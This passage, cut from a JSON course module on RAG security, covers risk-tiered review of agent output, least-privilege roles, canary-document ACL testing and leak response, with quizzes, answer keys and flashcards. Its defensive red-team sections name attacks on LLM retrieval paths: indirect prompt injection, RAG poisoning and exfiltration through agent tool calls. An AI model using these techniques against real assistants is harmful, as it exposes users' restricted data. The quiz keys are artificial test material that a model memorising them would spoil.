open-ended tools with narrow ones."},{"id":"w07-t18-s3","title":"Four thousand drafts a day","situation":"An agent drafts customer replies, about 4,000 a day. Replies can contain account data. A reviewer team currently approves every draft and has started approving in bulk.","constraints":["High volume","Account data in replies","Bulk approval"],"unknowns":["Which replies are irreversible or sensitive?","Can low-risk replies be undone?"],"question":"How do you redesign review?","options":[{"name":"Approve every draft with a simple yes or no","verdict":"poor","why":"At this volume reviewers stop checking, so it adds delay and no safety.","tradeoff":"Right for a small number of high-stakes actions."},{"name":"Risk-tier: approval with evidence for replies that carry account data or external links, templated auto-send for low-risk replies and a sampled audit","verdict":"best","why":"Reviewer attention goes where harm is possible, and the audit measures the rest.","tradeoff":"A tiering rule to maintain and some late detection on sampled items."},{"name":"Remove human review and add an output filter","verdict":"good","why":"Scales.","tradeoff":"Filters miss paraphrased or encoded data and nothing gates the action."}],"flips":[{"if":"Volume falls to a few dozen per day","then":"Approve all with evidence on screen."},{"if":"A regulator requires oversight for the class of decision","then":"Design review to meet that duty, with an audit trail."}],"takeaway":"Tier human review by risk and show evidence."}],"quiz":[{"id":"w07-t18-q1","type":"single","tag":"security","q":"Which role should the application hold for query-time calls to Azure AI Search with native ACLs, following least privilege?","options":["Search Index Data Contributor, so it can fix data","Search Service Contributor, so it can manage indexes","Search Index Data Reader, with the user's token in the header","Owner on the subscription"],"answer":2,"explain":"The caller needs Search Index Data Reader (or Contributor) and the user's token for ACL matching. Reader is the least privilege. Contributor, service contributor and owner grant write or management rights the query path never needs.","ref":"r12"},{"id":"w07-t18-q2","type":"multi","tag":"concept","q":"Which are OWASP LLM06 Excessive Agency mitigations? Choose all that apply.","options":["Minimise the extensions an agent can call","Avoid open-ended extensions such as running any shell command","Give the agent a broad admin credential so it never fails","Minimise the permissions extensions hold in other systems"],"answers":[0,1,3],"explain":"OWASP lists minimising extensions, their functions and their permissions, and avoiding open-ended extensions. A broad credential is the opposite of least privilege.","ref":"tr5"}],"flashcards":[{"front":"What are the four LLM06 mitigations?","back":"Minimise extensions, minimise their functions, avoid open-ended extensions (shell, fetch URL) and minimise their permissions, enforced through the identity they use."},{"front":"Which identities should be separate in a RAG system?","back":"Query-time retrieval (the user's token), ingestion (source read, index write), tool execution (task-specific) and admin debugging (dedicated elevated-read role)."},{"front":"How does Agent Framework gate a tool call for approval?","back":"Python: @tool with approval_mode always_require, with user_input_requests on the result. .NET: wrap in ApprovalRequiredAIFunction, which yields ToolApprovalRequestContent."}],"related":["w07-t13","w07-t05","w07-t17","w17-t01","w17-t02","w08-t11"],"refs":["r10","r12","r16","tr4","tr5","tr17"]},{"id":"w07-t19","order":19,"group":"Operations and defences","title":"Testing access control","minutes":9,"difficulty":"advanced","summary":"Prove access control and revocation end to end with canary documents and test principals, red-team the retrieval path against named attack techniques, and keep a leak-response runbook you have rehearsed.","useIf":"You operate a RAG system over permissioned content and need evidence that revocation and isolation work.","avoidIf":"You only need the mechanism of one ACL option. Use the access control topics first.","explain":[{"t":"p","md":"Test through the **whole stack**: ingest, index, retrieval, cache, prompt, answer and citation. A filter-builder unit test passes while a revoked user still reads a cached answer. The interview probe to practise is: how do you test that revoking access really removes documents from answers? Use a canary document, a revoked test user and an end-to-end check."},{"t":"table","caption":"A minimum ACL test matrix","head":["Case","Setup","Expected"],"rows":[["Allowed reader","Canary document, user in its group","Document is retrieved and cited"],["Denied user","Same document, user outside the group","Absent from results, citations, caches and logs"],["Revoked user","Remove the user, wait the stated SLA","Absent, including cached answers"],["Nested group","User reaches the group through two levels","Present (or absent if the design excludes nesting, as stated)"],["No token","Query without the user token","Public documents only [[r12]]"],["Empty or unknown ACL","Document whose ACL capture failed","Hidden, never public"],["Deleted source","Delete the canary at the source","Gone from index and caches within the SLA"],["Overage user","User with more than 200 groups","Correct groups resolved [[r23]]"]]},{"t":"p","md":"Gate releases on **zero leaks** and watch **recall for restricted callers** as a separate metric, because a safe filter that hides everything also fails. Run the matrix in CI, nightly against production with synthetic principals, and after every ACL, cache or index change. Keep immutable retrieval logs of ids, principal, filter and decision, which OWASP LLM08 recommends [[r2]]. For debugging, use elevated read with a dedicated role rather than the application key [[r12]]."},{"t":"p","md":"**Red team** the retrieval path with named techniques: indirect injection (AML.T0051.001), RAG poisoning (AML.T0070), gathering RAG-indexed targets (AML.T0064) and exfiltration through agent tool invocation (AML.T0086) [[r4]]. Pair it with detection: Defender for Cloud AI threat protection alerts on data leakage, poisoning and jailbreak attempts for supported Azure AI services, with text tokens only and commercial cloud only [[tr16]]."},{"t":"flow","title":"Leak response runbook (design reasoning)","direction":"h","steps":[{"title":"Contain","md":"Hide the document or path, purge caches, flip the feature flag.","tag":"minutes"},{"title":"Preserve","md":"Freeze retrieval logs: ids, principal, filter, decision.","tag":"evidence"},{"title":"Scope","md":"Find who retrieved which documents in the window.","tag":"impact"},{"title":"Fix","md":"Repair the ACL, sync, cache or filter cause and notify as required.","tag":"cause"},{"title":"Prevent","md":"Add the case to the matrix and drill the runbook.","tag":"learn"}]}],"whereToUse":["CI and nightly production checks for any permissioned RAG system","Pre-launch security reviews and red-team exercises","Validating that a sync or cache change did not widen access","Incident drills and post-incident regression tests"],"whenToUse":{"use":["Revocation or isolation is a stated promise","You change ACL sync, caches or the index often","A leak would trigger an incident or a notification duty"],"avoid":["Testing only the filter builder or only the index","Treating a red-team report as a substitute for regression tests","Running tests with an admin identity that bypasses the path users take"],"flips":["Content is public: reduce to a smoke test","Revocation is seconds: test continuously with synthetic principals","A new tool or source appears: add its attack path to the red-team plan"]},"alternatives":{"title":"Test approaches compared","head":["Approach","Wins when","Loses when","Cost or risk"],"rows":[["End-to-end canary matrix","You promise revocation and isolation","You never run it in production","Needs synthetic users and documents"],["Unit tests of filter code","Fast feedback on bugs","Leaks come from sync, caches, indexes","False confidence"],["Periodic red team","New attack paths, new tools","Findings are not turned into tests","Costly, point in time"],["Drift audit on a sample","A copy of permissions exists","Rare scopes are missed","Detects, does not prevent"],["Production monitoring and alerts","Live misuse detection","Unsupported services or modalities","Coverage limits, alert fatigue"]]},"pitfalls":[{"symptom":"Tests pass but users report leaks","cause":"Tests ran against the index with an admin key, skipping caches and the user token path","fix":"Test as a synthetic user through the production path and read results with a normal token"},{"symptom":"Revocation test passes in CI and fails in production","cause":"Production caches and sync intervals differ from the test setup","fix":"Run the canary against production with the real SLA wait"},{"symptom":"A fix is deployed and the leak returns next quarter","cause":"No regression test was added","fix":"Every incident adds a case to the matrix"},{"symptom":"No one can say who retrieved the leaked document","cause":"Retrieval logs hold no principal or document ids","fix":"Log ids, principal, filter and decision in an immutable store"}],"scenarios":[{"id":"w07-t19-s1","title":"What to test in CI","situation":"A team has unit tests for the function that builds the filter string and a manual check before release. Last month a revoked user read a cached answer. The team runs a pre-filter plus a semantic cache.","constraints":["Pre-filter plus semantic cache","Revocation promise of one hour","Manual checks only"],"unknowns":["Can synthetic users be created in the identity provider?","How long is the cache TTL?"],"question":"What do you add first?","options":[{"name":"More unit tests for the filter builder","verdict":"poor","why":"The leak came from a cache, which the filter builder never touches.","tradeoff":"Worthwhile as fast feedback beside end-to-end tests."},{"name":"An end-to-end canary matrix with allowed, denied, revoked, nested and no-token users, run through the full stack including caches","verdict":"best","why":"It exercises every copy of the permission and would have caught the cached answer.","tradeoff":"Needs synthetic principals and waiting for the SLA."},{"name":"Index-level tests with the admin key","verdict":"good","why":"Checks the ACL data in the index.","tradeoff":"Skips caches, the token path and the answer."}],"flips":[{"if":"No semantic cache exists","then":"Drop the cache case and keep the revoked-user wait."},{"if":"Revocation target is seconds","then":"Run the canary continuously in production."}],"takeaway":"Test every copy of a permission."},{"id":"w07-t19-s2","title":"A user shows an HR snippet","situation":"A user reports that the assistant quoted an HR document they should not see. The assistant serves several thousand users. You have retrieval logs with document ids and principals.","constraints":["Live leak report","Thousands of users","Retrieval logs available"],"unknowns":["Is the document still retrievable?","Which other users retrieved it?"],"question":"What do you do in the first hour?","options":[{"name":"Investigate the root cause before changing anything","verdict":"poor","why":"The document stays exposed while you investigate.","tradeoff":"Right once containment is in place."},{"name":"Contain first: hide the document and purge related caches, then freeze logs, scope who retrieved it, and only then fix the cause","verdict":"best","why":"It stops further exposure and keeps evidence for the scope and notification decision.","tradeoff":"The document is unavailable to legitimate readers meanwhile."},{"name":"Roll back to the previous index version","verdict":"good","why":"Fast and broad.","tradeoff":"It may restore stale ACLs and drops other legitimate changes."}],"flips":[{"if":"The leak spans a whole scope","then":"Disable that source and open a formal incident."},{"if":"Personal data is involved","then":"Involve the privacy and legal contacts for notification duties."}],"takeaway":"Contain first, then preserve, scope and fix."},{"id":"w07-t19-s3","title":"Small red-team budget","situation":"A team has three days for a red-team exercise on a RAG assistant that reads partner-supplied documents and can call one reply tool. They have a list of 500 generic jailbreak prompts.","constraints":["Three days","Partner-authored documents","One tool"],"unknowns":["Which exits exist (rendering, tool, logs)?","Which attack paths are already blocked deterministically?"],"question":"How do you spend the time?","options":[{"name":"Run all 500 generic jailbreak prompts","verdict":"poor","why":"They test direct injection and say little about poisoned documents and exits.","tradeoff":"Useful as a baseline for direct prompt attacks."},{"name":"Map the top attack paths to ATLAS techniques, test indirect injection, poisoning and tool exfiltration with real planted documents, and turn findings into regression tests","verdict":"best","why":"It follows how this system can actually be attacked and leaves durable tests [[r4]].","tradeoff":"Needs a threat model first and fewer total prompts."},{"name":"Run an automated scanner and accept its report","verdict":"good","why":"Cheap coverage of known patterns.","tradeoff":"Misses system-specific flows."}],"flips":[{"if":"No tools and no rendering exist","then":"Focus on permissions and poisoning."},{"if":"A new tool is added","then":"Re-run the tool-exfiltration cases."}],"takeaway":"Red-team the paths your system really has."}],"quiz":[{"id":"w07-t19-q1","type":"order","tag":"order","q":"Order the first steps of a leak response.","items":["Contain: hide the document or path and purge caches","Preserve: freeze retrieval logs with ids, principal and decision","Scope: find who retrieved which documents in the window","Fix the cause and add a regression test"],"explain":"Containment stops exposure, preserving logs keeps evidence, scoping sizes the impact and the fix plus a regression test prevents a repeat. Investigating before containing leaves the document exposed.","ref":"r2"},{"id":"w07-t19-q2","type":"single","tag":"diagnose","q":"Your ACL tests pass but a revoked user still reads an answer. Which missing test most likely explains it?","options":["A unit test for the filter builder","An end-to-end revoked-user test through caches, waiting for the stated SLA","A test of the embedding model's recall","A load test of the search service"],"answer":1,"explain":"Only an end-to-end revoked-user test through every copy of the permission, including caches, catches a stale answer. Filter-builder, recall and load tests do not exercise revocation.","ref":"r12"}],"flashcards":[{"front":"What is a canary document test?","back":"A planted document with known permissions and synthetic users. You check that allowed users get it, denied and revoked users do not, and that deletes propagate, end to end."},{"front":"What two metrics gate an ACL release?","back":"Zero leaks as a hard gate, and recall for restricted callers as a watched metric, since a filter that hides everything also fails."},{"front":"Name four ATLAS techniques to red-team a RAG path.","back":"AML.T0051.001 indirect prompt injection, AML.T0070 RAG poisoning, AML.T0064 gather RAG-indexed targets and AML.T0086 exfiltration via agent tool invocation."}],"related":["w07-t15","w07-t16","w07-t17","w07-l6","w07-l7","w14-t13","w17-t09"],"refs":["r2","r4","r12","r23","tr16"]}]});
